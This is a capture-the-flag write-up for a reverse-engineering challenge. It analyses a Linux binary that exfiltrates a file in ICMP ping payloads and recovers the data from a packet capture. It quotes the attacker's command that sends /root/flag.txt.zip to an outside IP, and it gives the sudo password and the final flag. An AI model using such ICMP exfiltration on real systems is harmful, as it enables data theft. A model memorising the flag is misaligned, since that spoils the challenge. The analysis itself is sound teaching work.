# Infinitely Complex Malware Pcaps

Thanks to `Samir Ghanem` for the idea.

## Authors

- Jarrod Cameron

## Category

- Reverse Engineering

## Description

I found some malware on my server where I keep all of my flags. I think it stole one of my flags but I can't figure out how!

Wireshark managed to capture some of the packets from my machine, hopefully this helps track down my flag.

## Difficulty

- Child's Play

## Points

420

## Files

- malware: The binary application
- malware.pcapng: A packet capture

## Solution

<details>
<summary>Spoiler</summary>

### Idea

Firstly, reverse engineer the malware to find that it's pinging a server. Each
of these ping packets contain a part of the file containing the flag.
Extracting this data from the packet dump reveals a zip file. This zip file
needs a password to extract the flag. This password can be seen from the telnet
session used by the attacker when `sudo` was called to run the malware.

### Walkthrough

#### 1. Initial Reconnaissance

Firstly, lets look at the malware file.

```
$ file ./malware
./malware: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6e5aec612593fe190147b1f285b4fb7d7db9d488, for GNU/Linux 3.2.0, stripped

$ ./malware

$ strace ./malware
execve("./malware", ["./malware"], 0x7ffede576dc0 /* 58 vars */) = 0
[snip]
+++ exited with 0 +++
```

Our initial reconnaissance hasn't returned anything interesting. Executing the
malware with and without `strace` does not reveal much.

Note to current/future malware authors: don't forget to strip your binaries!

#### 2. Static Analysis

The first basic block in the main function shows a call to `inet_aton()` with
`argv[2]` as the first argument:

```radare2
        │ 0x00001459 488d45d0       lea rax, [var_30h]             │
        │ 0x0000145d 488d5004       lea rdx, [rax + 4]             │
        │ 0x00001461 488b45c0       mov rax, qword [argv2]         │
        │ ; void *pin                                              │
        │ 0x00001465 4889d6         mov rsi, rdx                   │
        │ ; const char *cp                                         │
        │ 0x00001468 4889c7         mov rdi, rax                   │
        │ ; int inet_aton(const char *cp, void *pin)               │
        │ 0x0000146b e8e0fcffff     call sym.imp.inet_aton;[oa]    │
        │ 0x00001470 83f801         cmp eax, 1                     │
        │ 0x00001473 740a           je 0x147f                      │
        └──────────────────────────────────────────────────────────┘
                f t
                │ │
```

`inet_aton()` is used to convert an IPv4 address from a string into a `struct
in_addr` which is often used in with with other system calls. If there is an
error when calling `inet_aton()` the program will `exit(0)`.

#### 3. Dynamic Analysis With `strace`

Let's try running the malware again (using `strace`) but with an IPv4 address
as the second argument.

```
# NOTE: "AAAA" is just some random value for argv[1]
$ strace ./malware AAAA 127.0.0.1
[snip]
socket(AF_INET, SOCK_RAW, IPPROTO_ICMP) = -1 EPERM (Operation not permitted)
exit_group(0)                           = ?
+++ exited with 0 +++
```

It seems that the program has made some more progress, however the `socket()`
system call shows `EPERM (Operation not permitted)`. This is because Linux
restricts creating raw sockets (hence the `SOCK_RAW`) to root users. This can
be solved by running the malware as root :D

```
$ sudo strace ./malware AAAA 127.0.0.1
[snip]
socket(AF_INET, SOCK_RAW, IPPROTO_ICMP) = 3
openat(AT_FDCWD, "AAAA", O_RDONLY)      = -1 ENOENT (No such file or directory)
exit_group(0)                           = ?
+++ exited with 0 +++
```

The `openat()` system call is trying to open the file specified by `argv[1]`.
Let's create a _test file_ and try this again:

```
$ echo 'CTF{this_is_a_fake_flag}' > test.txt
$ sudo strace ./malware ./test.txt 127.0.0.1
socket(AF_INET, SOCK_RAW, IPPROTO_ICMP) = 3
openat(AT_FDCWD, "./test.txt", O_RDONLY) = 4
read(4, "CTF{this_is_a_fa", 16)         = 16
sendto(3, "\10\0\262wCS\0\0CTF{this_is_a_fa", 24, 0, {sa_family=AF_INET, sin_port=htons(0), sin_addr=inet_addr("127.0.0.1")}, 16) = 24
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=1, tv_nsec=0}, 0x7ffd2aaff050) = 0
read(4, "ke_flag}\n", 16)               = 9
sendto(3, "\10\0\f\1CS\0\1ke_flag}\n", 17, 0, {sa_family=AF_INET, sin_port=htons(0), sin_addr=inet_addr("127.0.0.1")}, 16) = 17
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=1, tv_nsec=0}, 0x7ffd2aaff050) = 0
read(4, "", 16)                         = 0
close(4)                                = 0
exit_group(0)                           = ?
+++ exited with 0 +++
```

It looks like the malware is using `sendto()` to send the contents of the file
after splitting it apart. Each time a chunk of the file is sent the program
sleeps for one second.

#### 4. Dynamic Analysis With `wireshark`

Let's have a closer look at the packets sent by the malware in Wireshark. Using
the command `sudo wireshark` will startup `wireshark` (root privileges are
needed to capture packets on an interface). After that, select the `Loopback:
lo` interface.

Running the command `sudo ./malware ./test.txt 127.0.0.1` will make the malware
resend the same packets. Wireshark should then display the packets sent by the
malware.

We can see the malware is sending _ICMP echo requests_!

At the top of Wirehsark there should be a text box that says `Apply a display
filter ...`. Using the filter `icmp.type == 8` Wireshark will only show the
ICMP packets sent by the malware and not the response from the destination.

Upon further inspection it can be seen that each of the ICMP packets have part
of the file's contents appended to the end. This can be seen by clicking on the
part of the file in the hex dump in the bottom panel.

#### 5. Extracting Data from Ping Packets

Now we know the malware is exfiltrating the file via ICMP echo requests let's
look at the original packet capture.

The following command will extract the bytes exfiltrated by the malware:

```bash
tshark -2 -R 'icmp.type == 8' -r malware.pcapng -T json \
        | jq --raw-output '.[]._source.layers.icmp.data["data.data"]' \
        | sed 's#^#/bin/echo -ne ":#g ; s#:#\\x#g ; s#$#"#g' \
        | bash \
        | xxd
```

The output can be seen below:

```
00000000: 504b 0304 0a00 0900 0000 4a78 c252 edf5  PK........Jx.R..
00000010: c41a 3f00 0000 3300 0000 0800 1c00 666c  ..?...3.......fl
[snip]
```

A quick summary of the above command:
- `tshark` is used to convert data in the `malware.pcapng` file into json. The
  filter `icmp.type == 8` is used to only show the ICMP echo request packets.
- `jq` is used to parse the json (created by `tshark`) to extract the data from
  each of the packets.
- `sed` is used to convert the data into `echo` commands. This makes it easier
  to convert the data from ASCII characters into bytes.
- `bash` is used execute the commands. This will convert the data exfiltrated
  by the malware back into the original file that it tried to send.
- `xxd` is used to print the results in a human readable format.

Now that the data exfiltrated by the malware have been identified we should
look inside for any potential flags :D

Using a modified version of the above command (swapping `xxd` for `file -`) we
can see the file type:

```bash
tshark -2 -R 'icmp.type == 8' -r malware.pcapng -T json \
        | jq --raw-output '.[]._source.layers.icmp.data["data.data"]' \
        | sed 's#^#/bin/echo -ne ":#g ; s#:#\\x#g ; s#$#"#g' \
        | bash \
        | file -
```

The output can be seen below:

```
/dev/stdin: Zip archive data, at least v1.0 to extract
```

The above results show that it's a zip archive. Let's try to extract the
contents and unzip the file:

```
$ tshark -2 -R 'icmp.type == 8' -r malware.pcapng -T json \
        | jq --raw-output '.[]._source.layers.icmp.data["data.data"]' \
        | sed 's#^#/bin/echo -ne ":#g ; s#:#\\x#g ; s#$#"#g' \
        | bash > data.zip

$ unzip data.zip
Archive:  data.zip
[data.zip] flag.txt password:
```

After all that work we still need a password!

```
         .:.
         yMMNh+-
         /MMMMMoss/`
          yMMMm  `/yy/`
          `dMMd     `/ys:
           .mMd        .+yo.                                                            `-:/oo`
            .mN`         `-sy:                                                    .-/ooyNNMMMd
             .dy            .+y+`                                           `-/ooso/-``/MMMMd`
              `hs             `/yo.                                    .:+oso+:.`      yMMMh`
               `yy`             `:yo.                             .:+oso/-.`          -MMMs`
                `oh.              `:yo::::::::::::::::::--.` .:+oso/-``              `dMN/
                  /d:               `-----------------:::/+oso/-.`                  `yMh.
                   -ho`                                                            `ym/`
                    `sh-   `.                                                     :hs.
                      :y+-os.                                                   -ss-
                       `ym+`                                           `     `:ss-
                       -m-                                             +s-`-oy+.
                      .d:       .:::.                                   :ddo-`
                     `d/       +dohMm:                   `/shy/`         .do
                    `ho       `MNsdMMh                   sN/sMMs          .m-
                    oh         yMMMMN/                   mMmNMMd           +d
                   -m.          :++/-                    /mNNNd-            m/
                   h+ `....`              `yhhs`          `--.              /m
                  -m.sdNNNmh+`             /oo+`                 ``.``      `N:
                  somMMMMMMMM/                                 -sdmmmdy:     sh
                  h:yMMMMMMMN:            `-::::-.`           /MMMMMMMMMo    -M.
                  h/ /ymmmds:            omh+/::/oh/          sMMMMMMMMMd     d+
                  +h                    .M/       :d          .hNMMMMMMm:     od
                  `m:                   `m/`      -m            -+oso+:`      .N`
                   :m`                   .sy+-.../h+                           h-
                    /-                      -////:.                            ``
```

#### 6. More Wireshark!

Let's go back to Wireshark and checkout the `malware.pcapng` file to see if
there are any more goodies that could help. Use the `wireshark malware.pcapng`
command to open the supplied packet capture. Let's try to filter down the
results for anything that might be interesting. We can sort by protocol and
hopefully find something useful.

After searching the list of protocols there is one that sticks out. Telnet!

If you haven't heard of telnet (that's probably a good thing) it used to be
used to connect to a machines remotely. Telnet doesn't encrypt communication
which makes it easy for us to checkout what was going on.

We can set the filter to `telnet` to only show us the telnet packets. We can
see the conversation over telnet by going to `Analyze` -> `Follow` -> `TCP
Stream`.

It seems the attacker managed to run the following command to exfiltrate the
file `/root/flag.txt.zip` to `192.168.15.131`:

```bash
sudo -S /tmp/malware /root/flag.txt.zip 192.168.15.131
```

We can also see the password that was used when `sudo` was executed:
`WhyArePeopleEvenUsingSudoTheseDays`.

#### 7. Using the Password on the Zip File

Let's try the password on the zip file we extracted earlier:

```bash
$ unzip data.zip
Archive:  data.zip
[data.zip] flag.txt password: WhyArePeopleEvenUsingSudoTheseDays
 extracting: flag.txt

$ cat flag.txt
SKYLIGHT{Who_kn3w_pIng_was_such_a_pa1n_to_pr0gram!}
```

### Flag

```txt
SKYLIGHT{Who_kn3w_pIng_was_such_a_pa1n_to_pr0gram!}
```

</details>
